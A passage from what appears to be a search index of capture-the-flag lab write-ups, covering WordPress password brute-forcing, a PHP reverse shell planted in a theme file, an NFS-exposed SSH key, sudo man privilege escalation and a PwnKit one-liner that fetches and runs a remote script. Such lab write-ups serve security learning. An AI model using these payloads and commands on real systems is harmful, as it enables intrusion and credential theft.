found: http://hydrogen.co/wordpress/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://hydrogen.co/wordpress/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 5.1.17 identified (Outdated, released on 2023-10-12).\n | Found By: Atom Generator (Aggressive Detection)\n |  - http://hydrogen.co/wordpress/?feed=atom, &lt;generator uri=\"https://wordpress.org/\" version=\"5.1.17\"&gt;WordPress&lt;/generator&gt;\n | Confirmed By: Style Etag (Aggressive Detection)\n |  - http://hydrogen.co/wordpress/wp-admin/load-styles.php, Match: '5.1.17'\n\n[i] The main theme could not be detected.\n\n[+] Enumerating Most Popular Plugins (via Passive Methods)\n\n[i] No plugins Found.\n\n[+] Enumerating Users (via Aggressive Methods)\n Brute Forcing Author IDs - Time: 00:00:01 &lt;=====&gt; (10 / 10) 100.00% Time: 00:00:01\n\n[i] User(s) Identified:\n\n[+] john\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n | Confirmed By: Login Error Messages (Aggressive Detection)\n\n[+] Performing password attack on Xmlrpc against 1 user/s\n[SUCCESS] - john / justin                                                          \nTrying john / justin Time: 00:00:19 &lt;          &gt; (130 / 1705)  7.62%  ETA: ??:??:??\n\n[!] Valid Combinations Found:\n | Username: john, Password: justin\n\n[+] WPScan DB API OK\n | Plan: free\n | Requests Done (during the scan): 1\n | Requests Remaining: 24\n\n[+] Finished: Wed Oct 18 03:33:37 2023\n[+] Requests Done: 185\n[+] Cached Requests: 6\n[+] Data Sent: 86.211 KB\n[+] Data Received: 168.161 KB\n[+] Memory used: 209.742 MB\n[+] Elapsed time: 00:00:25\n</code></pre> <p>Here we can see, we got <code>john:justin</code> as a login into the wordpress database. Then, we get an access into it.</p> <p></p>","tags":["ftp","wpscan","rce","linpeas","gtfobins","mysql"]},{"location":"writeup/random/hidrogen/#exploitation","title":"Exploitation","text":"","tags":["ftp","wpscan","rce","linpeas","gtfobins","mysql"]},{"location":"writeup/random/hidrogen/#foothold-rce","title":"Foothold - RCE","text":"<p>In this WordPress, the best practice is we need to try any function of the website server, and try to understand it. Maybe it is vulnerable to file upload or change of file content or anything that can get us the remote code execution. Here is some writeup that I found might be interesting to look on https://medium.com/secjuice/apocalyst-ctf-writeup-ccf9e2afb145</p> <pre><code>&lt;?php\n// php-reverse-shell - A Reverse Shell implementation in PHP\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n//\n// This tool may be used for legal purposes only.  Users take full responsibility\n// for any actions performed using this tool.  The author accepts no liability\n// for damage caused by this tool.  If these terms are not acceptable to you, then\n// do not use this tool.\n//\n// In all other respects the GPL version 2 applies:\n//\n// This program is free software; you can redistribute it and/or modify\n// it under the terms of the GNU General Public License version 2 as\n// published by the Free Software Foundation.\n//\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n//\n// You should have received a copy of the GNU General Public License along\n// with this program; if not, write to the Free Software Foundation, Inc.,\n// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\n//\n// This tool may be used for legal purposes only.  Users take full responsibility\n// for any actions performed using this tool.  If these terms are not acceptable to\n// you, then do not use this tool.\n//\n// You are encouraged to send comments, improvements or suggestions to\n// me at pentestmonkey@pentestmonkey.net\n//\n// Description\n// -----------\n// This script will make an outbound TCP connection to a hardcoded IP and port.\n// The recipient will be given a shell running as the current user (apache normally).\n//\n// Limitations\n// -----------\n// proc_open and stream_set_blocking require PHP version 4.3+, or 5+\n// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.\n// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.\n//\n// Usage\n// -----\n// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.\n\nset_time_limit (0);\n$VERSION = \"1.0\";\n$ip = '192.168.8.118';  // CHANGE THIS\n$port = 4444;       // CHANGE THIS\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'uname -a; w; id; /bin/sh -i';\n$daemon = 0;\n$debug = 0;\n\n//\n// Daemonise ourself if possible to avoid zombies later\n//\n\n// pcntl_fork is hardly ever available, but will allow us to daemonise\n// our php process and avoid zombies.  Worth a try...\nif (function_exists('pcntl_fork')) {\n    // Fork and have the parent process exit\n    $pid = pcntl_fork();\n\n    if ($pid == -1) {\n        printit(\"ERROR: Can't fork\");\n        exit(1);\n    }\n\n    if ($pid) {\n        exit(0);  // Parent exits\n    }\n\n    // Make the current process a session leader\n    // Will only succeed if we forked\n    if (posix_setsid() == -1) {\n        printit(\"Error: Can't setsid()\");\n        exit(1);\n    }\n\n    $daemon = 1;\n} else {\n    printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\n\n// Change to a safe directory\nchdir(\"/\");\n\n// Remove any umask we inherited\numask(0);\n\n//\n// Do the reverse shell...\n//\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n    printit(\"$errstr ($errno)\");\n    exit(1);\n}\n.\n.\n[snip]\n.\n.\n</code></pre> <p></p> <p>We can use this reverse shell payload to change the file content in <code>/themes/twentyseventeen/404.php</code> template. Then update the file and listen on port <code>4444</code>. I try to listen on my machine with an <code>IP = 192.168.37.138</code> but it cannot connect because it is not in the same network. So, we use SSH service. In this SSH, it is in restricted bash. We also can bypass this or use RCE payload like this. Before that, I grep the <code>flag3.txt</code> first.</p> <pre><code>john@hydrogrencorp:~$ ls -la\ntotal 52\ndrwxr-xr-x 3 john john  4096 Oct 24 05:32 .\ndrwxr-xr-x 3 root root  4096 Jan 17  2019 ..\n-rw------- 1 john john   554 Oct 20 01:56 .bash_history\n-rw-r--r-- 1 john john   220 Jan 17  2019 .bash_logout\n-rw-r--r-- 1 john john  3562 Jan 19  2019 .bashrc\n-r-------- 1 john john    39 Jan 18  2019 flag3.txt\ndrwx------ 2 john john  4096 Oct 19 07:52 .gnupg\n-rw------- 1 john john   581 Oct 19 03:53 .lesshst\n-rw------- 1 john john  1197 Oct 19 10:55 .mysql_history\n-rw-r--r-- 1 john john   675 Jan 17  2019 .profile\n-rw------- 1 john john 12288 Oct 17 10:08 .swp\njohn@hydrogrencorp:~$ cat flag3.txt\nflag{b4270e25c9fadba2b79e18055141d882}\njohn@hydrogrencorp:~$ \n</code></pre> <p>Back to RCE. Go to the file directory <code>/wp-content/themes/twentyseventeen/404.php</code> and we are in into the web shell!! </p> <pre><code>john@hydrogrencorp:~$ nc -lnvp 4444\nlistening on [any] 4444 ...\nconnect to [192.168.8.118] from (UNKNOWN) [192.168.8.118] 38727\nLinux hydrogrencorp 3.2.0-6-amd64 #1 SMP Debian 3.2.102-1 x86_64 GNU/Linux\n 05:17:35 up 7 days, 19:32,  2 users,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\njohn     pts/0    192.168.22.73    05:08   22.00s  0.00s  0.00s nc -lnvp 4444\njohn     pts/2    192.168.22.73    05:09   16.00s  0.00s  0.00s -rbash\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nsh: no job control in this shell\nsh-4.2$ script -qc /bin/bash /dev/null\nscript -qc /bin/bash /dev/null\nwww-data@hydrogrencorp:/usr/share/nginx/www/wordpress/wp-content/themes/twentyseventeen$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nwww-data@hydrogrencorp:/usr/share/nginx/www/wordpress/wp-content/themes/twentyseventeen$ \n</code></pre> <p></p> <p>We can find the <code>flag2.txt</code> in here</p> <pre><code>www-data@hydrogrencorp:/usr/share/nginx/www/wordpress/wp-content$ find / -name \"flag2.txt\" 2&gt;/dev/null\n/usr/share/nginx/www/wordpress.bak/flag2.txt\n/usr/share/nginx/www/wordpress/flag2.txt\nwww-data@hydrogrencorp:/usr/share/nginx/www/wordpress/wp-content$ cat /usr/share/nginx/www/wordpress/flag2.txt\nflag{db6029f93797df27262460156bfbe0b9}\n</code></pre> <p>After a while, I find nothing and then try to run the <code>linpeas</code> in here. There is something interesting that we can get. There is mysql credentials file</p> <pre><code>-rw------- 1 root root 333 Jan 17  2019 /etc/mysql/debian.cnf\nuser     = debian-sys-maint\npassword = GXSBRvrHFALvpIca\nuser     = debian-sys-maint\npassword = GXSBRvrHFALvpIca\n</code></pre> <p>Try login into it by give this command</p> <p><code>mysql --defaults-file=/etc/mysql/debian.cnf</code></p> <p>But we unsuccessful to login, so we need to get the root access first.</p>","tags":["ftp","wpscan","rce","linpeas","gtfobins","mysql"]},{"location":"writeup/random/hidrogen/#privesc","title":"Privesc","text":"<p>To gain a root user access, we can try give <code>sudo -l</code> but we cannot access it. So I try to login using SSH service and we are lucky it give something to look on.  </p> <pre><code>john@hydrogrencorp:~$ sudo -l\n[sudo] password for john: \nMatching Defaults entries for john on this host:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    insults\n\nUser john may run the following commands on this host:\n    (root) /usr/bin/man\n</code></pre> <p>Just ask our long-live friend, Google and making some research on how to run this, I found some interesting article here or we can read on gtfobins site too https://gtfobins.github.io/gtfobins/man/</p> <p>Give <code>sudo man man</code> and a man pager of man will be pop-up. So right now, we want to escape this. We just give command <code>!bash</code> and we get in into the root!!</p> <p></p> <pre><code>john@hydrogrencorp:~$ sudo man man\nroot@hydrogrencorp:/usr/share/man# find / -name \"flag4.txt\" 2&gt;/dev/null\n/root/flag4.txt\nroot@hydrogrencorp:/usr/share/man# cat /root/flag4.txt\nflag{6d24904be52c92fad1c79fe0e22fff20}\n</code></pre> <p>So the last one is <code>flag5.txt</code>. If we use <code>find / -name \"flag5.txt\" 2&gt;/dev/null</code>, there is no file of this. So we will assume it is in mysql database. We use the mysql credentials earlier.</p> <pre><code>root@hydrogrencorp:/tmp# mysql --defaults-file=/etc/mysql/debian.cnf\nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 7972\nServer version: 5.5.60-0+deb7u1-log (Debian)\n\nCopyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.\n\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nmysql&gt; \n</code></pre> <p><code>SHOW DATABASES;</code> --&gt; <code>USE wordpress;</code> --&gt; <code>SHOW TABLES;</code> --&gt; <code>SELECT * FROM wp_users;</code></p> <pre><code>mysql&gt; SELECT * FROM wp_users;\n+----+------------+------------------------------------+---------------+------------------+---------------------------------------------+---------------------+---------------------+-------------+--------------+----------------------------------------+\n| ID | user_login | user_pass                          | user_nicename | user_email       | user_url                                    | user_registered     | user_activation_key | user_status | display_name | secret                                 |\n+----+------------+------------------------------------+---------------+------------------+---------------------------------------------+---------------------+---------------------+-------------+--------------+----------------------------------------+\n|  1 | john       | $P$BbzHGQy0mhTKVJKP0rYhhbTwVvhQ9v1 | john          | john@hydrogen.co | https://www.youtube.com/watch?v=dQw4w9WgXcQ | 2023-10-18 18:28:37 |                     |           0 | john         | flag{a260af638f07d39c838810eda005ceb3} |\n+----+------------+------------------------------------+---------------+------------------+---------------------------------------------+---------------------+---------------------+-------------+--------------+----------------------------------------+\n1 row in set (0.00 sec)\n\nmysql&gt; \n</code></pre> <p>We got the last flag <code>flag{a260af638f07d39c838810eda005ceb3}</code></p>","tags":["ftp","wpscan","rce","linpeas","gtfobins","mysql"]},{"location":"writeup/random/hidrogen/#bonus","title":"Bonus","text":"<p>For the flag 5, we also can use phpmyadmin website account or mysql command to find it by using credentials <code>john:justin</code></p> <p></p>","tags":["ftp","wpscan","rce","linpeas","gtfobins","mysql"]},{"location":"writeup/random/napalm/","title":"Napalm","text":"<p>Today we will doing Boot2Root machine, Napalm.</p> <p></p>","tags":["nfs","ssh-key","linpeas","pwnkit"]},{"location":"writeup/random/napalm/#reconnaissance","title":"Reconnaissance","text":"<p><code>IP = 192.168.8.90</code></p> <p>First and foremost, doing nmap scan to gather information of the machine. We get this. Scan TCP and UDP.</p>","tags":["nfs","ssh-key","linpeas","pwnkit"]},{"location":"writeup/random/napalm/#port","title":"PORT","text":"<pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/kali/Desktop/internship/napalm]\n\u2514\u2500# nmap -p- --min-rate 5000 192.168.8.90             \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-16 23:10 EST\nNmap scan report for 192.168.8.90\nHost is up (0.0046s latency).\nNot shown: 65528 closed tcp ports (reset)\nPORT      STATE SERVICE\n22/tcp    open  ssh\n111/tcp   open  rpcbind\n2049/tcp  open  nfs\n39196/tcp open  unknown\n45521/tcp open  unknown\n49289/tcp open  unknown\n58387/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 21.31 seconds\n</code></pre>","tags":["nfs","ssh-key","linpeas","pwnkit"]},{"location":"writeup/random/napalm/#tcp","title":"TCP","text":"<pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/\u2026/Desktop/internship/napalm/nmap]\n\u2514\u2500# cat tcpscan.txt    \n# Nmap 7.94SVN scan initiated Thu Nov 16 20:14:42 2023 as: nmap -sCV -p 22,111,39196,45521,58387 -oN nmap/tcpscan.txt 192.168.8.90\nNmap scan report for 192.168.8.90\nHost is up (0.0050s latency).\n\nPORT      STATE SERVICE  VERSION\n22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 e9:3e:a2:9c:ab:b3:f4:f7:d0:51:5c:27:a3:c3:be:81 (RSA)\n|   256 f8:e1:6a:d4:23:07:11:36:2a:cf:42:8a:7b:b9:2b:52 (ECDSA)\n|_  256 8a:e0:75:ad:06:3f:06:e1:6e:94:07:ad:8f:42:33:e5 (ED25519)\n111/tcp   open  rpcbind  2-4 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100003  2,3,4       2049/udp6  nfs\n|   100021  1,3,4      33388/udp6  nlockmgr\n|   100021  1,3,4      39196/tcp   nlockmgr\n|   100021  1,3,4      39348/tcp6  nlockmgr\n|   100021  1,3,4      46481/udp   nlockmgr\n|   100227  2,3         2049/tcp6  nfs_acl\n|_  100227  2,3         2049/udp6  nfs_acl\n39196/tcp open  nlockmgr 1-4 (RPC #100021)\n45521/tcp open  mountd   1-3 (RPC #100005)\n58387/tcp open  mountd   1-3 (RPC #100005)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Thu Nov 16 20:15:12 2023 -- 1 IP address (1 host up) scanned in 30.76 seconds\n</code></pre> <p>We can see here, there is port <code>111</code> which is port for <code>rpcbind</code> and there <code>2049</code> port for <code>nfs</code> service connect to it</p>","tags":["nfs","ssh-key","linpeas","pwnkit"]},{"location":"writeup/random/napalm/#udp","title":"UDP","text":"<pre><code>Nmap scan report for 192.168.8.90\nHost is up, received reset ttl 128 (0.0047s latency).\nScanned at 2023-11-16 20:14:08 EST for 1597s\nNot shown: 998 open|filtered udp ports (no-response)\nPORT     STATE SERVICE REASON\n111/udp  open  rpcbind udp-response ttl 128\n2049/udp open  nfs     udp-response ttl 128\n\nRead data files from: /usr/bin/../share/nmap\n# Nmap done at Thu Nov 16 20:40:45 2023 -- 1 IP address (1 host up) scanned in 1610.40 seconds\n</code></pre>","tags":["nfs","ssh-key","linpeas","pwnkit"]},{"location":"writeup/random/napalm/#exploitation","title":"Exploitation","text":"<p>For the exploitation part, I dunno nothing about <code>rpcbind</code>, so we ask our friend <code>mr.google</code> what is this and is there any writeup about this port. In simpler terms, it is a service that helps manage and facilitate communication between different processes on a network using the RPC protocol. I find something interesting on here about nfs</p> <p>https://0xdf.gitlab.io/2022/05/23/htb-jail.html#nfs---tcp-2049</p> <p>We will try this command</p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/kali/Desktop/internship/napalm]\n\u2514\u2500# showmount -e 192.168.8.90  \nExport list for 192.168.8.90:\n/home/superpoweradmin/\n</code></pre> <p>It shows something interesting here, which is we can mount it to our machine and get the file into our disk. But first we need to do the directory <code>/mnt/opt</code> or any directory that we want to mount into.</p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/kali/Desktop/internship/napalm]\n\u2514\u2500# mount -t nfs 192.168.8.90:/home/superpoweradmin /mnt/opt/\n</code></pre> <p>So right now it is successful connect to our machine. Directly we copy the file and put in our working machine directory for easy access.</p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/\u2026/Desktop/internship/napalm/opt]\n\u2514\u2500# ls -la\ntotal 56\ndrwxr-xr-x 7 root root 4096 Nov 16 21:25 .\ndrwxr-xr-x 4 kali kali 4096 Nov 16 22:54 ..\n-rw------- 1 root root   66 Nov 16 21:25 .bash_history\n-rw-r--r-- 1 root root  220 Nov 16 21:25 .bash_logout\n-rw-r--r-- 1 root root 3771 Nov 16 21:25 .bashrc\ndrwx------ 2 root root 4096 Nov 16 21:25 .cache\ndrwxr-x--- 3 root root 4096 Nov 16 21:25 .config\n-r-------- 1 root root   39 Nov 16 21:25 flag2.txt\ndrwx------ 2 root root 4096 Nov 16 21:25 .gnupg\ndrwxr-xr-x 2 root root 4096 Nov 16 21:25 .nano\n-rw-r--r-- 1 root root  675 Nov 16 21:25 .profile\n-rw------- 1 root root    5 Nov 16 21:25 .python_history\ndrwx------ 2 root root 4096 Nov 17 01:35 .ssh\n-rw-r--r-- 1 root root  167 Nov 16 21:25 .wget-hsts   \n</code></pre> <p>We can see there is a <code>flag2.txt</code>. Submit it first</p> <p><code>flag{141a18f81cf9a84b7361f01f9b1d2860}</code></p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/\u2026/internship/napalm/opt/.ssh]\n\u2514\u2500# ls -la\ntotal 24\ndrwx------ 2 root root 4096 Nov 17 01:35 .\ndrwxr-xr-x 7 root root 4096 Nov 16 21:25 ..\n-rw------- 1 root root 1533 Nov 16 21:25 authorized_keys\n-rw------- 1 root root 1679 Nov 16 21:25 id_rsa\n-rw-r--r-- 1 root root  407 Nov 16 21:25 id_rsa.pub\n-rw-r--r-- 1 root root  222 Nov 16 21:25 known_hosts\n</code></pre> <p>Then I see something interesting which is the <code>.ssh</code> file open it and tadaa there is <code>id_rsa</code> key. It make much more easier to get the foothold with this. Directly we can use this command to get access into the machine</p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/kali/Desktop/internship/napalm]\n\u2514\u2500# ssh -i id_rsa superpoweradmin@192.168.8.90\n#############################################################\n#####                           #####\n#####                           #####\n#####             NaPaLm SSH Server         #####\n#####                           #####\n#####                           #####\n#####   Please Do not attack our server. Your IP are    #####\n#####            recorded in our log        #####\n#####                           #####\n#####               flag1           #####\n#####      flag{72dbcd2759d2eeb78a8c9a93a146eba6}   #####\n#############################################################\nWelcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-210-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com/\n\n142 packages can be updated.\n3 updates are security updates.\n\nNew release '18.04.6 LTS' available.\nRun 'do-release-upgrade' to upgrade to it.\n\n\nLast login: Fri Nov 17 12:47:28 2023 from 192.168.22.75\nsuperpoweradmin@napalm-07:~$\n</code></pre> <p>We get into the machine and directly there is <code>flag1.txt</code>, grab it.</p>","tags":["nfs","ssh-key","linpeas","pwnkit"]},{"location":"writeup/random/napalm/#privileges-escalation","title":"Privileges Escalation","text":"<p>So for the privesc part, we need to know what is running in this machine and anything that we can exploit. <code>wget</code> command can be use, so we utilize it and download the <code>linpeas.sh</code>, <code>pspy64</code> or <code>lse.sh</code>.</p> <p>After a while running all of this, I found nothing interesting and try to crack the id_rsa key perhaps it might be give something to me or exploit the kernel version and so on. </p> <p>Then, someone said that dont think to hard. just look on the <code>linpeas</code> carefully. With carefulness, I scroll it and there is in <code>linpeas</code> said that we can use <code>PwnKit</code> to exploit this machine. Directly I tried it with oneliner command. Run this and boom we got the root shell.</p> <pre><code>superpoweradmin@napalm-07:~$ sh -c \"$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)\"\nroot@napalm-07:/home/superpoweradmin#\n</code></pre> <p>Go to <code>/root</code> directory and grab the flag</p> <pre><code>root@napalm-07:~# cat flag3.txt \nflag{fa4af3abc1a53c21e7b6598bb9fa7507}\n</code></pre>","tags":["nfs","ssh-key","linpeas","pwnkit"]},{"location":"writeup/random/nitrogen/","title":"Nitrogen","text":""},{"location":"writeup/random/nitrogen/#reconnaissance","title":"Reconnaissance","text":""},{"location":"writeup/random/oxygen/","title":"Oxygen","text":"<p>Today we will doing Boot2Root machine, Oxygen.</p> <p></p>","tags":["apache-struts"]},{"location":"writeup/random/oxygen/#reconnaissance","title":"Reconnaissance","text":"<p><code>IP = 192.168.8.114</code></p> <p>First and foremost, doing nmap scan to gather information of the machine. We get this. For this time, I will scan all things:- TCP,UDP.</p>","tags":["apache-struts"]},{"location":"writeup/random/oxygen/#port","title":"PORT","text":"<pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/\u2026/Desktop/internship/oxygen/nmap]\n\u2514\u2500# nmap -p- --min-rate 10000 192.168.8.114                       \nStarting Nmap 7.94 ( https://nmap.org ) at 2023-11-03 02:57 EDT\nNmap scan report for 192.168.8.114\nHost is up (0.0022s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n8080/tcp open  http-proxy\n\nNmap done: 1 IP address (1 host up) scanned in 19.70 seconds\n</code></pre>","tags":["apache-struts"]},{"location":"writeup/random/oxygen/#tcp","title":"TCP","text":"<pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/\u2026/Desktop/internship/oxygen/nmap]\n\u2514\u2500# cat tcpscan.txt \n# Nmap 7.94 scan initiated Thu Nov  2 21:12:24 2023 as: nmap -sV -sC -p 22,8080 -o nmap/tcpscan.txt 192.168.8.114\nNmap scan report for 192.168.8.114\nHost is up (0.0022s latency).\n\nPORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)\n| ssh-hostkey: \n|   2048 3f:eb:13:04:af:2b:ab:d0:20:8a:d6:b9:7b:bc:0b:39 (RSA)\n|   256 4f:9d:3c:8b:06:65:dd:5c:19:0d:a8:9f:cc:d3:da:11 (ECDSA)\n|_  256 b0:81:90:25:01:46:87:e8:4a:a8:bc:de:38:8f:e8:32 (ED25519)\n8080/tcp open  http-proxy\n|_http-open-proxy: Proxy might be redirecting requests\n| http-title: Struts2 Showcase\n|_Requested resource was showcase.action\n| fingerprint-strings: \n|   FourOhFourRequest: \n|     HTTP/1.1 404 \n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 1108\n|     Date: Fri, 03 Nov 2023 01:12:33 GMT\n|     Connection: close\n|     &lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 404 \n|     Found&lt;/title&gt;&lt;style type=\"text/css\"&gt;h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;\n|   GetRequest: \n|     HTTP/1.1 302 \n|     Set-Cookie: JSESSIONID=A9A5A06A913393BF1F1919846D0232B2; Path=/; HttpOnly\n|     Location: http://localhost:8080/showcase.action\n|     Content-Type: text/html\n|     Content-Length: 0\n|     Date: Fri, 03 Nov 2023 01:12:33 GMT\n|     Connection: close\n|   HTTPOptions: \n|     HTTP/1.1 405 \n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 1108\n|     Date: Fri, 03 Nov 2023 01:12:33 GMT\n|     Connection: close\n|     &lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 405 \n|     Method Not Allowed&lt;/title&gt;&lt;style type=\"text/css\"&gt;h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/he\n|   RTSPRequest: \n|     HTTP/1.1 400 \n|     Date: Fri, 03 Nov 2023 01:12:33 GMT\n|_    Connection: close\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8080-TCP:V=7.94%I=7%D=11/2%Time=6544490D%P=x86_64-pc-linux-gnu%r(Ge\nSF:tRequest,F1,\"HTTP/1\\.1\\x20302\\x20\\r\\nSet-Cookie:\\x20JSESSIONID=A9A5A06A\nSF:913393BF1F1919846D0232B2;\\x20Path=/;\\x20HttpOnly\\r\\nLocation:\\x20http:/\nSF:/localhost:8080/showcase\\.action\\r\\nContent-Type:\\x20text/html\\r\\nConte\nSF:nt-Length:\\x200\\r\\nDate:\\x20Fri,\\x2003\\x20Nov\\x202023\\x2001:12:33\\x20GM\nSF:T\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(HTTPOptions,4F0,\"HTTP/1\\.1\\x20405\nSF:\\x20\\r\\nContent-Type:\\x20text/html;charset=utf-8\\r\\nContent-Language:\\x\nSF:20en\\r\\nContent-Length:\\x201108\\r\\nDate:\\x20Fri,\\x2003\\x20Nov\\x202023\\x\nSF:2001:12:33\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;!doctype\\x20html&gt;&lt;htm\nSF:l\\x20lang=\\\"en\\\"&gt;&lt;head&gt;&lt;title&gt;HTTP\\x20Status\\x20405\\x20\\xe2\\x80\\x93\\x20\nSF:Method\\x20Not\\x20Allowed&lt;/title&gt;&lt;style\\x20type=\\\"text/css\\\"&gt;h1\\x20{font\nSF:-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;fo\nSF:nt-size:22px;}\\x20h2\\x20{font-family:Tahoma,Arial,sans-serif;color:whit\nSF:e;background-color:#525D76;font-size:16px;}\\x20h3\\x20{font-family:Tahom\nSF:a,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;\nSF:}\\x20body\\x20{font-family:Tahoma,Arial,sans-serif;color:black;backgroun\nSF:d-color:white;}\\x20b\\x20{font-family:Tahoma,Arial,sans-serif;color:whit\nSF:e;background-color:#525D76;}\\x20p\\x20{font-family:Tahoma,Arial,sans-ser\nSF:if;background:white;color:black;font-size:12px;}\\x20a\\x20{color:black;}\nSF:\\x20a\\.name\\x20{color:black;}\\x20\\.line\\x20{height:1px;background-color\nSF::#525D76;border:none;}&lt;/style&gt;&lt;/he\")%r(RTSPRequest,49,\"HTTP/1\\.1\\x20400\nSF:\\x20\\r\\nDate:\\x20Fri,\\x2003\\x20Nov\\x202023\\x2001:12:33\\x20GMT\\r\\nConnec\nSF:tion:\\x20close\\r\\n\\r\\n\")%r(FourOhFourRequest,4F0,\"HTTP/1\\.1\\x20404\\x20\\\nSF:r\\nContent-Type:\\x20text/html;charset=utf-8\\r\\nContent-Language:\\x20en\\\nSF:r\\nContent-Length:\\x201108\\r\\nDate:\\x20Fri,\\x2003\\x20Nov\\x202023\\x2001:\nSF:12:33\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;!doctype\\x20html&gt;&lt;html\\x20\nSF:lang=\\\"en\\\"&gt;&lt;head&gt;&lt;title&gt;HTTP\\x20Status\\x20404\\x20\\xe2\\x80\\x93\\x20Not\\x\nSF:20Found&lt;/title&gt;&lt;style\\x20type=\\\"text/css\\\"&gt;h1\\x20{font-family:Tahoma,Ar\nSF:ial,sans-serif;color:white;background-color:#525D76;font-size:22px;}\\x2\nSF:0h2\\x20{font-family:Tahoma,Arial,sans-serif;color:white;background-colo\nSF:r:#525D76;font-size:16px;}\\x20h3\\x20{font-family:Tahoma,Arial,sans-seri\nSF:f;color:white;background-color:#525D76;font-size:14px;}\\x20body\\x20{fon\nSF:t-family:Tahoma,Arial,sans-serif;color:black;background-color:white;}\\x\nSF:20b\\x20{font-family:Tahoma,Arial,sans-serif;color:white;background-colo\nSF:r:#525D76;}\\x20p\\x20{font-family:Tahoma,Arial,sans-serif;background:whi\nSF:te;color:black;font-size:12px;}\\x20a\\x20{color:black;}\\x20a\\.name\\x20{c\nSF:olor:black;}\\x20\\.line\\x20{height:1px;background-color:#525D76;border:n\nSF:one;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;\");\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at 